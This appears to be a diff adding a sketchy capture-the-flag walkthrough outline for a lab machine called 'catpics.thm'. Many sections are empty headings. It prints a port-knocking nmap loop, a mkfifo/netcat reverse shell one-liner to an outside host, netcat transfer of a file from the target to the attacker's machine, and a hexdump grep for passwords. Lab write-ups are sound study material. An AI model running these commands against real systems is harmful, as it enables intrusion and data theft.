@@ -1,0 +1,36 @@
+Machine Information
+Initial Recon
+phpBB
+
+Port Knocking
+for x in 1111, 2222, 3333, 4444; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x catpics.thm; done
+knock
+
+Anonymous FTP
+
+
+Internal Shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+Custom Executable
+──(root)
+└─# nc -nlvp 443 > runme
+listening on [any] 443 ...
+
+Now back on the server we send the file to Kali by redirecting it using netcat that is on there:
+# nc 10.8.165.116 443 < home/catlover/runme
+
+──(root)
+└─# nc -nlvp 443 > runme
+listening on [any] 443 ...
+connect to [10.8.165.116] from (UNKNOWN) [10.10.91.88] 38002
+^C
+
+
+Hexdump
+hexdump -C runme | grep -B 5 -A 5 password
+ 
+Strings
+SSH Access
+Escaping Container
+Root+1
